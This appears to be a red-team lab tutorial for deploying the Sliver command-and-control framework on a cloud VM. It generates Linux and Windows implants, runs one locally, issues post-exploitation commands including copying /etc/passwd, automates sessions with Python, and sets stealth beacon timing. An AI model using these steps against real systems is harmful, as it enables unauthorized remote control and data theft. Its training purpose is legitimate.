# 🧠 Deploy Sliver C2 in a Cloud VM  
## 🚨 Command & Control (C2) Red Teaming 

---

![Linux](https://img.shields.io/badge/OS-Ubuntu_22.04-blue)
![C2](https://img.shields.io/badge/Framework-Sliver_C2-red)
![Python](https://img.shields.io/badge/Python-Automation-green)
![Security](https://img.shields.io/badge/Domain-Red_Team-purple)
![Level](https://img.shields.io/badge/Level-Advanced-darkred)

---

# 🎯 Objectives

✔ Deploy Sliver C2 in a cloud Linux VM  
✔ Generate and manage implants (payloads)  
✔ Establish C2 sessions with targets  
✔ Execute post-exploitation commands  
✔ Automate Sliver operations using Python  
✔ Understand modern C2 architecture  
✔ Apply OPSEC best practices in C2 environments  

---

# 📌 Prerequisites

- 🐧 Linux CLI knowledge  
- 🌐 TCP/IP & networking basics  
- 🎯 Penetration testing fundamentals  
- 🧠 Understanding of C2 concepts  
- 🐍 Basic Python scripting  
- 💻 Terminal tool experience  

---

# ☁️ Lab Environment

✔ Ubuntu 22.04 Cloud VM (Al Nafi Lab)  
✔ Root / sudo privileges  
✔ Internet access enabled  
✔ Python 3.x pre-installed  
✔ Development tools available  

---

# 🧩 TASK 1 — Install Sliver C2 Framework

---

## 🔷 Step 1: System Preparation

```bash id="sys_update"
sudo apt update && sudo apt upgrade -y
sudo apt install -y curl wget git build-essential python3 python3-pip
📦 Step 2: Download Sliver
cd /opt
sudo mkdir sliver
cd sliver

sudo wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -O sliver-server
sudo wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -O sliver-client

sudo chmod +x sliver-server sliver-client

sudo ln -s /opt/sliver/sliver-server /usr/local/bin/sliver-server
sudo ln -s /opt/sliver/sliver-client /usr/local/bin/sliver-client
⚙️ Step 3: Initialize Server
sudo sliver-server

🧾 Create operator when prompted:

Username: redteam
Password: SecurePass123!

Restart in daemon mode:

sudo sliver-server daemon
🔌 Step 4: Connect Client
sliver-client
connect
info
🧩 TASK 2 — Generate & Use Implants
💣 Step 1: Create Implants
generate --http localhost:8080 --os linux --arch amd64 --format executable --save /tmp/
generate --dns localhost --os linux --arch amd64 --format executable --save /tmp/ --name dns-implant
generate --http localhost:8080 --os windows --arch amd64 --format executable --save /tmp/ --name win-implant
implants
🌐 Step 2: Start Listener
http --lport 8080
jobs
info
🧪 Step 3: Simulated Execution
cd /tmp
chmod +x *_linux
./[implant-name]_linux &

Then in Sliver:

sessions
use [session-id]
🧠 Step 4: Post Exploitation Commands
info
getuid
pwd
ls
cd /home
shell whoami
shell uname -a
shell ps aux | head
download /etc/passwd /tmp/passwd-copy
🧩 TASK 3 — Python Automation for Sliver
📦 Install Dependencies
pip3 install requests grpcio grpcio-tools protobuf
mkdir -p /opt/sliver-automation
cd /opt/sliver-automation
🐍 Sliver Automation Script
#!/usr/bin/env python3
import subprocess
import os

class SliverAutomation:
    def __init__(self):
        self.client = "sliver-client"

    def execute_sliver_command(self, command):
        script = f"connect\n{command}\nexit"
        path = "/tmp/sliver_script.txt"

        with open(path, "w") as f:
            f.write(script)

        result = subprocess.run(
            [self.client, "-c", path],
            capture_output=True,
            text=True
        )

        os.remove(path)
        return result.stdout

    def list_sessions(self):
        print(self.execute_sliver_command("sessions"))

    def generate_implant(self):
        cmd = "generate --http localhost:8080 --os linux --arch amd64 --format executable --save /tmp/"
        print(self.execute_sliver_command(cmd))

    def start_listener(self):
        print(self.execute_sliver_command("http --lport 8080"))

    def run(self):
        while True:
            print("""
1. Sessions
2. Generate Implant
3. Start Listener
4. Exit
""")
            choice = input("Choice: ")

            if choice == "1":
                self.list_sessions()
            elif choice == "2":
                self.generate_implant()
            elif choice == "3":
                self.start_listener()
            elif choice == "4":
                break

if __name__ == "__main__":
    SliverAutomation().run()
🧪 Make Executable
chmod +x sliver_automation.py
🧩 TASK 4 — Session Monitoring Automation
📡 Monitor Script
#!/usr/bin/env python3
import subprocess
import time
import re

class SliverMonitor:
    def __init__(self):
        self.sessions = set()

    def get_sessions(self):
        result = subprocess.run(
            ['sliver-client', '-c', 'connect\nsessions\nexit'],
            capture_output=True,
            text=True
        )
        return result.stdout

    def parse(self, output):
        return set(re.findall(r'[a-f0-9-]{36}', output))

    def run(self):
        while True:
            output = self.get_sessions()
            current = self.parse(output)

            new = current - self.sessions
            if new:
                print("[+] New sessions:", new)

            self.sessions = current
            print("[*] Active sessions:", len(current))

            time.sleep(10)

if __name__ == "__main__":
    SliverMonitor().run()
🚀 Run Monitor
python3 session_monitor.py
🔐 TASK 5 — HTTPS & OPSEC Configuration
🔒 HTTPS Listener
https --lport 8443 --cert /opt/sliver/server.crt --key /opt/sliver/server.key
📄 OPSEC Config
{
  "listeners": {
    "http": {"port": 8080, "enabled": true},
    "https": {"port": 8443, "enabled": true}
  },
  "implants": {
    "default_os": "linux",
    "default_arch": "amd64",
    "beacon_interval": 60,
    "jitter": 30
  },
  "automation": {
    "auto_recon": true,
    "max_sessions": 10
  }
}
🧯 TROUBLESHOOTING
❌ Sliver Not Starting
sudo pkill sliver-server
sudo sliver-server --debug
❌ Implant Not Connecting
sudo ufw status
curl http://localhost:8080
❌ Python Errors
pip3 install grpcio protobuf requests
which sliver-client
🧠 LAB OUTCOME

✔ Sliver C2 deployed in cloud VM
✔ Implants generated & executed
✔ Active command-and-control sessions established
✔ Post-exploitation commands executed
✔ Python automation built for C2 operations
✔ Session monitoring system implemented
✔ OPSEC configuration applied

🚀 KEY TAKEAWAYS
🧠 Sliver is a modern open-source C2 framework
⚡ Automation improves red team efficiency
🔐 OPSEC is critical for stealth operations
🐍 Python enables scalable C2 control
🎯 Sessions = full remote control capability
⚠️ DISCLAIMER

This lab is strictly for authorized security training and ethical penetration testing only.
Unauthorized use of C2 frameworks is illegal.
